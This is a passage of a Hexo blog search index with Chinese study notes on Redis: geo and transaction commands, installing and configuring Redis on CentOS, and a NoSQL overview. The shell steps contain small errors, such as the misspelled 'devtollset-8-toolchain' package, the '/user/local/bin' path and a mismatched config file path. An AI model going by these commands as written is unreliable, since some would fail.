member…]</td><td>添加地理位置（经度、维度、名称）（有效经度：-180度到180度；有效纬度：-85.05112878度到85.05112878度）</td></tr><tr><td>geopos &lt;key&gt; &lt;member&gt; [member…]</td><td>获得指定地区member的坐标</td></tr><tr><td>geodist &lt;key&gt; &lt;member1&gt; &lt;member2&gt; [m|km|ft|mi]</td><td>获取两个指定地区位置之间的直线距离（单位：米|千米|英尺|英里，默认单位米）</td></tr><tr><td>georadius &lt;key&gt; &lt;longitude&gt; &lt;latitude&gt; radius    m|km|ft|mi</td><td>以给定的经纬度为中心找出某一半径radius内的元素</td></tr></tbody></table><h2 id="Redis事务命令">Redis事务命令</h2><p>一个事务从开始到执行会经历以下三个阶段：</p><ul><li>开始事务</li><li>命令入队</li><li>执行事务</li></ul><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>multi</td><td>标记一个事务块的开始，开始对命令的组队阶段</td></tr><tr><td>exec</td><td>执行所有事务块内的命令，开始执行阶段</td></tr><tr><td>discard</td><td>取消事务，放弃执行事务块内的所有命令</td></tr><tr><td>watch &lt;key&gt; [key…]</td><td>监视一个（或多个）key，如果在事务执行之前这个（或这些）key被其他命令锁改动，那么事务将被打断</td></tr><tr><td>unwatch</td><td>取消watch命令对所有key的监视</td></tr></tbody></table><p>组队阶段中某个命令出现了命令报错，执行阶段整个的所有队列都会被取消。</p><p>而当组队阶段无报错，执行阶段某一命令出现了命令报错，则只有报错的命令不会被执行，其他命令不受影响。</p><p>当出现事务冲突时，Redis往往呈现出<code>乐观锁</code>的形式进行处理，即在使用完数据<code>修改版本号</code>等机制，提高吞吐量，而Redis就是利用这种<code>check-and-set</code>机制实现事务。</p><h3 id="事务三特性">事务三特性</h3><table><thead><tr><th>特性</th><th>描述</th></tr></thead><tbody><tr><td>单独的隔离操作</td><td>事务中的所有命令都会序列化、按顺序地执行。事务在执行的过程中，不会被其他客户端发送来的命令请求所打断</td></tr><tr><td>没有隔离级别的概念</td><td>队列中的命令没有提交之前都不会实际地被执行，因为事务提交前任何指令都不会被实际执行</td></tr><tr><td>不保证原子性</td><td>Redis同一个事务中如果有一条命令执行失败，其后的命令仍然会被执行，没有回滚</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos安装Redis及相关操作</title>
      <link href="/posts/9d3a5b2a/"/>
      <url>/posts/9d3a5b2a/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Centos导入Redis安装包">Centos导入Redis安装包</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>第一种方案</span></div>    <div class="hide-content"><h3 id="前往Redis官网下载安装包">前往<a href="http://redi.io">Redis官网</a>下载安装包</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/1.4b8tzfon68k0.jpg" alt="1"></p><h3 id="通过Xftp将已下载好的安装包拖拽到centos的新建目录下">通过Xftp将已下载好的安装包拖拽到centos的新建目录下</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/2.kd9zl46gwc0.jpg" alt="2"></p><h3 id="查看安装包是否在选定目录下">查看安装包是否在选定目录下</h3><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/3.6app3qipdg40.jpg" alt="3"></p></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>第二种方案</span></div>    <div class="hide-content"><p>在Centos直接安装，下载之前，建议新建一个文件夹来存放安装包</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://download.redis.io/releases/redis-6.2.4.tar.gz   #下载最新版即可</span><br></pre></td></tr></table></figure></div></div><h2 id="准备工作">准备工作</h2><ol><li>安装C语言的编译环境gcc</li></ol><p>依次输入以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">yum install centos-release-scl scl-utils-build</span><br><span class="line">yum install -y devtollset-8-toolchain</span><br><span class="line">scl enable devtoolset-8 bash</span><br></pre></td></tr></table></figure><ol start="2"><li>查看gcc是否安装成功</li></ol><p>检测gcc版本</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc --version</span><br></pre></td></tr></table></figure><p>安装成功如下:</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210722/4.1zo605jol5wg.jpg" alt="4"></p><h2 id="解压并安装">解压并安装</h2><ol><li>解压安装包</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf redis-6.2.4.tar.gz</span><br></pre></td></tr></table></figure><ol start="2"><li>解压完成后进入目录</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd redis-6.2.4</span><br></pre></td></tr></table></figure><ol start="3"><li><p>在目录下执行make命令，编译成C文件</p><div class="note info no-icon flat"><p>注意：如果没有安装C语言编译环境，make命令会报错</p><p>报错信息：jemalloc/jemalloc.h: 没有那个文件或目录</p><p>解决方案：检测gcc是否安装成功，并运行make distclean</p></div></li><li><p>在目录下进行安装</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">make install</span><br></pre></td></tr></table></figure><h2 id="安装目录：-user-local-bin">安装目录：/user/local/bin</h2><table><thead><tr><th style="text-align:left">文件名</th><th style="text-align:left">介绍</th></tr></thead><tbody><tr><td style="text-align:left">redis-benchmark</td><td style="text-align:left">性能测试工具</td></tr><tr><td style="text-align:left">redis-check-aof</td><td style="text-align:left">修复有问题的AOF文件</td></tr><tr><td style="text-align:left">redis-check-rdb</td><td style="text-align:left">修复有问题的dump.rdb文件</td></tr><tr><td style="text-align:left">redis-sentinel</td><td style="text-align:left">Redis哨兵启动，用于主从复制、集群使用</td></tr><tr><td style="text-align:left"><font color='red'>redis-server</td><td style="text-align:left">Redis服务器启动</td></tr><tr><td style="text-align:left"><font color='red'>redis-cli</td><td style="text-align:left">Redis客户端，操作入口</td></tr></tbody></table><h2 id="设置密码（非必选）">设置密码（非必选）</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>方法一：通过配置文件（/etc/redis.conf）进行设置</span></div>    <div class="hide-content"><p>这种方法在设置密码后需要重启redis生效。</p><ol><li>首先找到redis的配置文件—redis.conf文件</li><li>然后修改里面的requirepass（requirepass 是配置redis访问密码的参数）<br>这个本来是注释起来了的，将注释去掉，或者另起一行</li><li>将后面对应的字段设置成自己想要的密码，<code>:wq</code>保存退出。</li><li>重启redis服务，即可。</li></ol><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/1.1d2ur3l3zk9s.jpg" alt=""><br><code>vim编辑器</code>下 normal 模式下搜索指定内容（按Esc ）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/requirepass      # Enter进行搜索， n搜索下一个，N搜索上一个</span><br></pre></td></tr></table></figure></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>方法二：通过命令设置密码</span></div>    <div class="hide-content"><p>这种方法相对简单，不需要重启redis服务。连接redis之后，通过命令设置，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config set requirepass 123456   # 这样就把密码改为123456</span><br></pre></td></tr></table></figure><p>设置以后就可以用指令查看密码</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config get requirepass</span><br></pre></td></tr></table></figure><p>如下图</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/2.668t28c62000.png" alt=""><br>密码设置之后，当你退出再次连上redis的时候，就需要输入密码了，不然是无法操作的。<br>这里有两种方式输入密码，一是连接的时候直接输入密码，而是连接上之后再输入密码，分别如下所示：</p><p><img src="https://cdn.jsdelivr.net/gh/ZekerTop/images@main/20210906/3.5vnulnpk93k0.png" alt=""></p><div class="note warning no-icon flat"><p>注：通过命令行修改了密码之后，配置文件（/etc/redis.conf）的 requirepass 字段后面的密码是不会随之修改的。</p></div></div></div><h2 id="前台启动（不推荐）">前台启动（不推荐）</h2><p>运行redis-server命令启动，但命令行窗口不能关闭，否则服务器停止</p><h2 id="后台启动（推荐）">后台启动（推荐）</h2><ol><li>修改后台启动设置</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd /opt/redis-6.2.4             # 进入redis目录下</span><br><span class="line">ls                              # 查看文件</span><br><span class="line">cp redis.conf /etc/redis.conf   # 为方便操作，复制redis.conf文件到其他目录下</span><br><span class="line">vim /opt/redis.conf             # 进入编辑器修改文件</span><br></pre></td></tr></table></figure><p>在编辑器中通过<font color='red'>\daemonize</font>查找，将文件内的<font color='red'>daemonize no</font>改为<font color='red'>yes</font>，保存退出，使服务器能在后台启动</p><ol start="2"><li>后台启动</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-server /etc/redis.conf</span><br></pre></td></tr></table></figure><ol start="3"><li><p>客户端通过输入<font color='red'>redis-cli</font>命令进行访问</p><div class="note info no-icon flat"><p>多个端口号可输入redis-cli -p 端口号</p></div></li><li><p>密码登陆（<font color='red'>如果前面设置了的话</font>）</p></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth &quot;你的密码&quot;   # 进入redis-cli后</span><br></pre></td></tr></table></figure><p>这样就能在redis客户端正常执行命令了。</p><ol start="5"><li>查看进程</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep redis</span><br></pre></td></tr></table></figure><h2 id="关闭后台Redis">关闭后台Redis</h2><p>一、单实例关闭</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli shutdown</span><br></pre></td></tr></table></figure><p>二、多实例关闭，指定端口关闭</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -p 端口号 shutdown</span><br></pre></td></tr></table></figure><p>三、关闭Redis进程</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kill -9 进程号</span><br></pre></td></tr></table></figure><p>四、在Redis终端中输入shutdown进行关闭</p>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis详细概述</title>
      <link href="/posts/389b592e/"/>
      <url>/posts/389b592e/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="技术分类">技术分类</h2><table><thead><tr><th style="text-align:left">解决问题类型</th><th style="text-align:left">技术</th></tr></thead><tbody><tr><td style="text-align:left">功能性</td><td style="text-align:left">JAVA、Jsp、RDBMS、Tomcat、HTML、Linux、JDBC、SVN</td></tr><tr><td style="text-align:left">扩展性</td><td style="text-align:left">Struts、Spring、SpringMVC、Hibernate、Mybatis</td></tr><tr><td style="text-align:left">性能</td><td style="text-align:left">NoSQL、Java线程、Hadoop、Nginx、MQ、ElasticSearch</td></tr></tbody></table><p>随着web技术的不断发展，用户访问量的大幅度提升，同时也产生了大量的用户数据，加之智能移动设备的普及，<br>所有的互联网平台都面临着巨大的性能挑战。</p><div class="note danger no-icon flat"><p>web服务器面临着CPU及内存压力，数据库服务器面临着IO压力。</p></div><h2 id="问题及主要解决方案">问题及主要解决方案</h2><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>CPU及内存压力：主要为session存储问题</span></div>    <div class="hide-content"><p>但session应该存在哪里呢？</p><ol><li><p>存储在cookie中</p><p>优点：极高的扩展性和可用性</p><p>缺点：不安全</p></li><li><p>存储在文件服务器或者数据库里</p><p>优点：简单高性能，支持分布式与集群</p><p>缺点: 数据库的大量IO效率问题</p></li><li><p>session复制</p><p>优点： 实现简单、配置较少、当网络中有机器Down掉时不影响用户访问</p><p>缺点： 广播式复制有一定廷时，会带来一定网络开销；session对象内容相同，空间浪费造成session数据冗余，节点（服务器）越多浪费越大</p></li><li><p>存储在缓存数据库（例NoSQL数据库）</p><p>优点： 不经过IO，减少访问数据库的频率，完全在内存中，速度快，数据结构简单，无形中缓解了CPU及内存压力</p></li></ol></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>IO压力</span></div>    <div class="hide-content"><p>随着数据量的增多，数据库操作逐渐麻烦，效率也急剧降低</p><ol><li><p>数据库表进行拆分</p><p>水平切分、垂直切分、读写分离，通过破坏一定的业务逻辑来换取性能</p></li><li><p>缓存数据库（例NoSQL数据库）</p><p>通过添加缓存数据库，从中查询数据，从而减少IO的读操作，极大地提高查询效率</p></li></ol></div></div><h2 id="NoSQL数据库概述">NoSQL数据库概述</h2><p>NoSQL(Not Only SQL)，意思为“不仅仅是SQL”，泛指非关系型数据库。</p><p>NoSQL相较于MySQL，它不依赖业务逻辑方式存储，而以简单的key-value模式存储，因此大大的增加了数据库的扩展能力。</p><ul><li>不遵循SQL标准</li><li>不支持ACID（即原子性、一致性、隔离性、持久性）</li><li>远超于SQL的性能</li></ul><div class="note success flat"><p>NoSQL数据库打破了传统关系型数据库以业务逻辑为依据的存储模式，而是针对不同数据结构类型改为以性能为最有限的存储方式。</p></div><div class="hide-toggle" style="border: 1px solid #e8fafe"><div class="hide-button toggle-title" style="background-color: #e8fafe;color: color"><i class="fas fa-caret-right fa-fw"></i><span>适用场景</span></div>    <div class="hide-content"><ul><li>对数据高并发读写，例如“购物秒杀系统”</li><li>海量数据读写</li><li>对数据高可扩展性的</li></ul></div></div><div class="hide-toggle" style="border: 1px solid #fff8e9"><div class="hide-button toggle-title" style="background-color: #fff8e9;color: color"><i class="fas fa-caret-right fa-fw"></i><span>不适用场景</span></div>    <div class="hide-content"><ul><li>取代通过键查询，而是通过值来查询。 Key-Value数据库中根本没有通过值查询的途径。</li><li>需要储存数据之间的关系。在Key-Value数据库中不能通过两个或以上的键来关联数据。</li><li>事务的支持。在Key-Value数据库中故障产生时不可以进行回滚。</li></ul></div></div><h3 id="常见NoSQL数据库">常见NoSQL数据库</h3><table><thead><tr><th>数据库名称</th><th>特点</th></tr></thead><tbody><tr><td>Memcache</td><td>1. 很早出现的NoSQL数据库<br>2. 多线程+锁的机制，数据库都在内存中，一般不持久化<br>3. 支持简单的key-value模式，支持类型单一<br>4. 一般是作为缓存数据库辅助持久化的数据库</td></tr><tr><td>Redis</td><td>1. 几乎覆盖了Memcache的绝大部分功能<br>2. 单线程+多路IO复用的机制，数据都在内存中，支持持久化，主要用作备份恢复<br>3. 除了支持简单的key-value模式，还支持多种数据结构的存储，如list、set、hash、zset等<br>4. 一般是作为缓存数据库辅助持久化的数据库</td></tr><tr><td>MongoDB</td><td>1. 文档型数据库<br>2. 数据都在内存中，若内存不足，则把不常用的数据存到硬盘<br>3. 虽然是key-value模式，但是对value（尤其是json）提供强大的查询功能<br>4. 支持二进制数据及大型对象<br>5. 可根据数据特点替代RDBMS，成为独立数据库，亦或配合RDBMS,存储特定数据</td></tr></tbody></table><div class="note orange icon simple"><i class="note-icon fas fa-battery-half"></i><p>看完上面对NoSQL的介绍，对Redis有一个大概了解了吧</p></div><h2 id="Redis概述">Redis概述</h2><p>Redis是当今社会最受欢迎的NoSQL数据库之一，是一个使用ANSI C编写的开源，遵守BSD协议、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，且提供多种语言的API。</p><div class="note primary no-icon flat"><p>Redis具备以下特性：</p><ul><li>开源C语言代码，支持单线程+多路IO复用，不依赖外部库，速度极快</li><li>数据持久化，支持多种数据结构、编程语言</li><li>高并发读写，支持lua脚本，主从复制</li><li>高可用，支持分布式，理论上可以无限扩展</li></ul></div><div class="note primary no-icon flat"><p>Redis的应用场景包括：<br>缓存系统（“热点”数据：高频读、低频写)、计数器、消息队列系统、排行榜、社交网络和实时系统。</p></div><span class="hide-inline"><button type="button" class="hide-button button--animated" style="background-color: far fa-hand-point-right;color:  green larger">看看哪些大厂在使用Redis？  </button><span class="hide-content">github，twitter，微博，Stack Overflow，阿里巴巴，百度，腾讯，美团，搜狐...... </span></span>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> Redis </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/posts/4a17b156/"/>
      <url>/posts/4a17b156/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Welcome-to-my-blog">Welcome to my blog!</h2><p>by zeker</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
